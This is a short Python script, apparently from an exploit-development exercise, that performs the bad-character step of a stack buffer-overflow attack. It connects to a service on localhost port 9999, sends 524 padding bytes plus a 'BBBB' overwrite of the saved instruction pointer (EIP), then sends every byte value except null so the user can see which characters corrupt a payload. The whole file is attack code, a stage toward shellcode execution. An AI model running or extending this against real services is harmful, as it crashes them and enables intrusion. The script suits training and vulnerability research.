#!/usr/bin/env python3

import socket, time, sys, math

ip = "localhost"
port = 9999

eip_pos = 524
after_eip = eip_pos * b"A" + b"BBBB"

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = "\x00"
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars

usechars = bytes(usechars, "latin-1")
#print(allchars)

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    print("Sending badchars.")
    s.send(after_eip+usechars+b'\n') #add \r\n if can't recv data
    print("Sent: "+str(usechars))
    
except Exception as e:
  print("Exception: "+str(e))
  sys.exit(0)
